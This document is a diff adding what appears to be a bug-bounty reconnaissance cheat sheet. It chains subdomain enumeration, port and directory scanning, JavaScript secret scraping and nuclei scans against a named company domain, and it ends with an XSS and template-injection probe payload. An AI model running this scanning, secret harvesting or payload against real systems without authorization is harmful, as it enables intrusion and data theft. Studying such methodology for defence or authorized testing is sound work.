@@ -1,0 +1,34 @@
+subl domains.txt
+
+subfinder -dL domains.txt -all -recursives -o subdomains.txt
+
+# add more search from crt.sh
+curl -s https://crt.sh/\?q\=\$domain\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | anew subdomains2.txt
+curl -s https://crt.sh/\?q\=\navient.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | anew subdomains2.txt
+
+cat subdomains2.txt | httpx-toolkit -l subdomains2.txt -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt
+
+naabu -list subdomains2.txt -c 50 -nmap-cli 'nmap -sC -sV' -o naabu_full.txt
+
+dirsearch -l subdomains_alive.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -F -o directory.txt -w ../../../../onelistforallshort.txt
+
+
+cat subdomains_alive.txt | gau > params.txt
+
+cat params.txt | uro -o filterparam.txt [tail -n 18000 params.txt | uro -o filterparams.txt], [head -n 17000 params.txt | uro >> filterparams.txt]
+
+cat filterparam.txt | grep ".js$" > jsfiles.txt
+
+cat jsfiles.txt | uro | anew jsfiles.txt
+
+cat jsfiles.txt | while read url; do python3 ../../../../secretfinder/SecretFinder.py -i $url -o cli >> secret.txt; done
+
+cat filterparams.txt | sort -u > sorted_filtered_list.txt or python3 sort.py
+
+nuclei -list filterparams.txt -c 70 -rl 200 -fhr -lfa -t ../../../../CoffinCNt/ -o nucleinavient.txt -es info
+
+
+
+# Check for Xss/sqli in any input field
+
+'"><svg/onload=prompt(5);>{{7*7}}
